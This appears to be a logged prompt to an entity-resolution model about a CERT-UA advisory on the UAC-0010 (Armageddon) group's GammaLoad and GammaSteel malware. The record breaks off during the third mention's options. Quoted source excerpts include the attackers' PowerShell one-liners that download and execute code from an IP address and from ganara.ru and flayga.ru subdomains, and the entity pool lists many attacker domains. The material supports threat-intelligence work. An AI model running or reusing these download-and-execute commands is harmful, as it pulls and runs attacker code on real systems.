=== REQUEST (ollama gemma4:31b) ===
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For each mention you decide two independent things: **which entity it is**, and **where it sits under a broader entity**.

For each mention below you are given a numbered list of options. Exactly one option is always "NEW ENTITY" — choose it when the mention refers to an entity that is not any of the others. Options are ordered by retrieval score, which is not evidence of identity; do not let position influence you.

## Part 1 — identity (`choice`)

Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence.

Two names denote the same entity when they name the same specific thing and differ only in written form:

- one carries a vendor, publisher, or organization prefix the other omits ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, or case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor on an otherwise identical name ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix on an otherwise identical name ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word that only states what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name into another language or script.

Two names denote different entities, however related, when:

- their version, edition, year, or numeric identifier differs, or one carries such a marker and the other does not;
- one is a part, component, or member of the other, or the other is the family, suite, or group it belongs to;
- one is a file, sample, or artifact and the other is the program, actor, or system that produced or handles it;
- the base names themselves differ, even if they are similar in spelling, purpose, or context.

When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

Whenever several options are alike except for such an identifier, a number, or a few characters, match those characters exactly and choose that option. Never choose an option whose identifier differs from the mention's, however small the difference.

If the base names match and only the written form differs, choose that option rather than NEW ENTITY. In every other uncertain case choose "NEW ENTITY", because duplicates are repairable later and wrong merges are not.

## Part 2 — the broader entity (`parent`, `relation`)

The second decision only applies when you chose NEW ENTITY. A mention that is a *narrower* thing than one of the options is NOT the same entity — it is a new entity that hangs under it. Record that instead of forcing a merge.

Set `parent` to the **P-number** of the narrowest entity in the "Known entities" pool that is genuinely broader than the mention, and `relation` to one of:

- `"narrower-of"` — the same claim restated less precisely. Every fact true of the mention stays true of the parent, only vaguer: a specific version under the versionless product, a model under its product line, a named instance under its type.
- `"part-of"` — a distinct component, member, or subdivision of the parent. The mention is not the parent described loosely; it is one piece of it.

The pool lists every entity this source already put on the table, including the other mentions you are deciding now. A parent is often there even when it is nowhere in the mention's own option list — a component and the system it belongs to rarely resemble each other by name.

Set both to `null` when no pooled entity is broader, when the only relationship is topical, or when you are unsure. A missing edge is recoverable; a wrong one distorts every later rollup. Never set `parent` on a mention you linked in Part 1 — an entity cannot be both the same as an option and narrower than it. Never point a parent at the mention itself.

Ask it of every mention you did not link, not only of the obvious ones: a version under its versionless product, a component under its suite, a file under the tool that produced it, a unit under the organization it belongs to, a model under its product line.

Each mention shows its category's ladder of granularity levels when one exists, and each option shows the level it currently sits on. Use them to check your answer: a parent must sit at a broader level than the mention, and two things at the same level are candidates for identity, not for an edge.

## Part 3 — the gloss

For every mention you did NOT link, write `gloss`: one short factual description of what the thing is, grounded in the source and **not restating its name**. It is used to retrieve this entity later, never as identity evidence. Write `null` if the source says nothing descriptive.

## Output

Source context may be used only when it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output a single raw JSON object, no markdown fences, no commentary, one entry per mention in the order given:
{ "choices": [ { "mention": "<mention>", "category": "<category>", "choice": <option number>, "parent": <P-number or null>, "relation": "narrower-of" | "part-of" | null, "gloss": "<short description or null>" } ] }

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ої пошти (зі скомпрометованих акаунтів і на приватні електронні адреси) HTM-дроперів (в тому числі, в UTF-16 кодуванні), що ініціюють ланцюг доставки GammaLoad.PS1 на комп'ютер жертви.</p><p>Метою зловмисників, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">136bd98383e5b3e06b63f2" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Obj"
Known entities in this source (possible parents):
  P1. QuickMute
  P2. GammaLoad.PS1_v2
  P3. LOADJUMP
  P4. RoyalRoad
  P5. loader.exe
  P6. LoadEdge
  P7. GoDownloader
  P8. core.dll
  P9. GzipLoader
  P10. GammaLoad
  P11. TRYxaEbX.ps1
  P12. stage1.ps1
  P13. z.ps1
  P14. stage2.ps1
  P15. TRYxaEbX_2.ps1
  P16. OUTSTEEL
  P17. VTune Amplifier for Windows
  P18. GraphSteel
  P19. .NET Framework
  P20. WinExe
  P21. DAAL
  P22. dhdhk0k34.com
  P23. MarsStealer
  P24. FTPGetter
  P25. JesterStealer
  P26. Adobe Experience Manager
  P27. Hashcat
  P28. Mimikatz
  P29. needrestart
  P30. Meterpreter
  P31. PowerShell
  P32. 223329.exe
  P33. POWERGAP
  P34. 62ea.exe
  P35. SPECTR.Shell
  P36. 966449.exe
  P37. MS PowerPoint
  P38. ms-msdt.exe
  P39. alt.exe
  P40. rfusclient.exe
  P41. csrss.exe
  P42. oracle-java.exe
  P43. GammaSteel.PS1
  P44. GammaSteel.NET
  P45. HarvesterX
  P46. PowerShell (powershell.exe)
  P47. mshta.exe
  P48. GammaLoad.PS1
  P49. s8.h.mchost.ru
  P50. acteran.ru
  P51. bilitora.ru
  P52. giraffe-tour.ru
  P53. apoxipodes.ru
  P54. fishitor.ru
  P55. t.co
  P56. tiloraso.ru
  P57. nirsoft.me
  P58. billyhot.ru
  P59. dodortar.ru
  P60. candidar.ru
  P61. lnk-upload.dodortar.ru
  P62. tortunas.ru
  P63. motocheck.in
  P64. stormpredictor.host
  P65. meteolink.host
  P66. kopratiso.ru
  P67. successilin.top
  P68. erwini.ru
  P69. mulleti.ru
  P70. bul-opros.top
  P71. ukr.net
  P72. iol.pt
  P73. toknowall.com
  P74. gopoppers.com
  P75. varanasiclick.ru
  P76. podologaneri.it
  P77. co-opros.top
  P78. districoperav.icu
  P79. potrakit.ru
  P80. rivierafamily.com
  P81. mx-out-14.default-host.net
  P82. nikotod.ru
  P83. nitikora.ru
  P84. tridiuma.ru
  P85. yandex.ru
  P86. olei.ro
  P87. jevejosader.top
  P88. enlamentedeunasesor.com
  P89. milotrad.ru
  P90. milotraf.ru
  P91. lingrevelat.com
  P92. qiwardos.ru
  P93. dis.gov.ua
  P94. ritionalvalueon.top
  P95. aspe.ro
  P96. omyce.ru
  P97. pastebin.com
  P98. leonardis.ru
  P99. jokotras.ru
  P100. afi-opros.top
  P101. skreatortemp.site
  P102. mitraseo.hol.es
  P103. parodadoca.ru
  P104. marmaris.com.ua
  P105. xsph.ru
  P106. nx0.ru
  P107. ncscc.gov.ua
  P108. www.msftncsi.com
  P109. edisk.ukr.net
  P110. staystrongjewels.com
  P111. wi-opros.top
  P112. xcasinobonuses.net
  P113. helpzzfound.site
  P114. servebeer.com
  P115. evil.server.com
  P116. 3utilities.com
  P117. whoer.net
  P118. agreminj.com
  P119. viewdns.net
  P120. airmauritiusticket.com
  P121. ddns.net
  P122. icanhazip.com
  P123. api.dev-com.sc
  P124. fluoxi.com
  P125. noip.com
  P126. apokil.com
  P127. onthewifi.com
  P128. bounceme.net
  P129. plexbd.net
  P130. sytes.net
  P131. brunoboys.net
  P132. dcshost.net
  P133. d-upl.ddns.net
  P134. gov-ua.info
  P135. freedynamicdns.org
  P136. ns.ns2-dns.com
  P137. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
  P138. freedynamicdns.net
  P139. dyndns.com
  P140. ns.ns3-dns.com
  P141. gotdns.ch
  P142. www.facebook.com
  P143. barbacoalosmartinez.com
  P144. www.michiganmastereltiempo.com
  P145. www.symantec.com
  P146. photobucket.com
  P147. atlantar.ru
  P148. motoristo.ru
  P149. moolin.ru
  P150. bubenci.ru
  P151. callsol.ru
  P152. clipperso.ru
  P153. cooperi.ru
  P154. detroito.ru
  P155. farafauler.ru
  P156. flayga.ru
  P157. ganara.ru
  P158. hawksi.ru
  P159. hofsteder.ru
  P160. kilitro.ru
  P161. kurapat.ru
  P162. lnasfe.ru
  P163. lopasts.ru
  P164. mafirti.ru
  P165. metanat.ru
  P166. mitlubald.ru
  P167. paparat.ru
  P168. pasamart.ru
  P169. qkcew.ru
  P170. rncsq.ru
  P171. tarlit.ru
  P172. tbwelo.ru
  P173. wicksl.ru
  P174. xcqef.ru
  P175. nxkad.ru
  P176. dnslookup.seowebchecker.com
  P177. ip-api.com
  P178. tools.nexcess.net
  P179. viewdns.info
  P180. www.portcheckers.com
  P181. lover.printing82.detroito.ru
Mentions:
1. "GammaLoad.PS1" (Software)
     1. QuickMute [aliases: QuickMute]
     2. GammaLoad.PS1_v2 [aliases: GammaLoad.PS1_v2]
     3. LOADJUMP [aliases: LOADJUMP]
     4. RoyalRoad [aliases: RoyalRoad]
     5. NEW ENTITY
2. "GammaSteel.PS1" (Software)
     1. GammaLoad [aliases: GammaLoad, GammaLoad.PS1]
     2. TRYxaEbX.ps1 [aliases: TRYxaEbX.ps1]
     3. GammaLoad.PS1_v2 [aliases: GammaLoad.PS1_v2]
     4. stage1.ps1 [aliases: stage1.ps1]
     5. NEW ENTITY
3. "GammaSteel.NET" (Software)
     1. GammaLoad [aliases: GammaLoad, GammaLoad.PS1]
     2. .NET Framework [aliases: .NET Framework]
